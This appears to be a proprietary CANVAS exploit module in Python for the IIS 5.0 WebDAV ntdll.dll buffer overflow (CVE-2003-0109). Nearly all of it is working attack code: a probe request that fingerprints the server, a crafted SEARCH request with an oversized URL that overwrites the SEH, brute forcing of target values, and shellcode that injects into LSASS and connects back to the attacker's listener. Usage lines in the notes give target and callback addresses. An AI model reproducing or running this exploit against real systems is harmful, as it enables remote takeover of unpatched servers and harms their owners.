#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME='Microsoft IIS 5.0 WebDav Overflow'
DESCRIPTION='Microsoft IIS 5.0 WebDav ntdll.dll Buffer Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='03/17/03'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/bulletin/MS03-007.mspx'
DOCUMENTATION['Repeatability']='Repeatable'
DOCUMENTATION["CVE Name"] = "CVE-2003-0109"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0109"
DOCUMENTATION['CVSS'] = 7.5

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000']
PROPERTY['MSADV']='MS03-007'

CHANGELOG="""
"""

NOTES="""
Not the most reliable vulnerability ever. We are causing a heap overflow that
turns into a stack overflow a bit later, causing an access violation with the
SEH under our control. Unfortunately, the stack buffer is Unicode. We just set
the SEH address to something that will hopefully point to something where our
buffer is located. The shellcode migrates into LSASS.EXE while keeping the heap
safe during the migration, it is better since IIS will likely die by itself due
to heap corruption shortly after.

It seems that on SP0 and SP1 this gives birth to a totally different flaw,
which is less than optimal to do something reliable.

Tested on:
Windows 2000 Server SP2 English OOTB
Windows 2000 Server SP3 English OOTB

Usage:
./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
./exploits/iis5webdav/iis5webdav.py -v 1 -t 10.10.13.133 -l 10.10.13.1 -d 5555
"""

targets={
    0:['Autoversioning (N/A)',[]],
    1:['Windows 2000 SP2-SP3',[0x14,0x15]], #seems to work decently?
    2:['Windows 2000 SP2-SP3 (Bruteforce)',[i for i in range(0x01,0xff)]],
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.port=80
        self.ssl=0
        self.version=0
        self.badstring='\0\n ?.:/'
        self.webroot='c:\\inetpub\\wwwroot\\'
        self.subesp=2000
        return

    def createShellcode(self):
        self.shellcode=self.createHeapSafeInjectIntoProcess(self.badstring,self.callback.ip,self.callback.port,revert=1)
        return self.shellcode

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.WIN32MOSDEF]

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.ssl=self.argsDict.get('ssl',self.ssl)
        return

    def test(self):
        self.getArgs()
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect')
            return 0
        body=''
        body+='<?xml version="1.0"?>\n'
        body+='<g:searchrequest xmlns:g="DAV:">\n'
        body+='<g:sql>\n'
        body+='SELECT "DAV:displayname" from scope()\n'
        body+='</g:sql>\n'
        body+='</g:searchrequest>'
        header=''
        header+='SEARCH / HTTP/1.1\r\n'
        header+='Host: localhost\r\n'
        header+='Content-Type: text/xml\r\n'
        header+='Content-Length: %d\r\n'%(len(body))
        header+='\r\n'
        request=header+body
        self.websend(s,request)
        try:
            response=self.webrecv(s)
        except:
            response=''
        #print response
        s.close()
        if response.count('Microsoft-IIS/5.0')>0 and response.count('404 Resource Not Found')>0:
            return 1
        return 0

    def trySegment(self,segment):
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Sleeping 10 seconds since we could not connect')
            time.sleep(10)
            try:
                s.connect((self.host,self.port))
            except:
                self.log('Connection still failed')
                return 0
        self.log('Connected')
        body=''
        body+='<?xml version="1.0"?>\n'
        body+='<g:searchrequest xmlns:g="DAV:">\n'
        body+='<g:sql>\n'
        body+='SELECT "DAV:displayname" from scope()\n'
        body+='</g:sql>\n'
        body+='</g:searchrequest>'
        #the offset of the SEH within our buffer depends on a string that is
        #constructed around the base web root directory, we want to spray it
        #around so that if alignement is slightly different from one version
        #to another we will still fall on our code
        base='scope(\'"'+self.webroot
        offset=((0xef78-0xdef4)/2)-len(base)
        #print '%d'%(offset)
        data=''
        data+='A'*(offset-0x80)
        for i in range(0x80):
            data+=struct.pack('<BB',segment,segment) #SEH
        data+='B'*(0x10000-len(data)-len(self.shellcode))
        data+=self.shellcode
        header=''
        header+='SEARCH /'+data+' HTTP/1.1\r\n'
        header+='Host: localhost\r\n'
        header+='Content-Type: text/xml\r\n'
        header+='Content-Length: %d\r\n'%(len(body))
        header+='\r\n'
        request=header+body
        self.websend(s,request)
        try:
            response=self.webrecv(s)
        except:
            response=''
        self.log('Response='+prettyprint(response))
        s.close()
        if self.ISucceeded():
            return 1
        return 0

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d'%(NAME,self.host,self.port),showlog=True)
        if self.version==0:
            self.log('No autoversioning support for this exploit!')
            return 0
        self.info,self.segments=targets[self.version]
        for segment in self.segments:
            if chr(segment) not in self.badstring:
                self.log('Trying segment 0x%02x\n'%(segment))
                if self.trySegment(segment)==1:
                    self.setInfo('%s attacking %s:%d (success!)'%(NAME,self.host,self.port),showlog=True)
                    return 1
                if self.state==self.HALT:
                    self.setInfo('%s attacking %s:%d (failed!)'%(NAME,self.host,self.port),showlog=True)
                    return 0
                if self.trySegment(segment)==1:
                    self.setInfo('%s attacking %s:%d (success!)'%(NAME,self.host,self.port),showlog=True)
                    return 1
                self.log('Sleeping for 10 seconds')
                time.sleep(10)
        self.setInfo('%s attacking %s:%d (failed!)'%(NAME,self.host,self.port),showlog=True)
        return 0

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
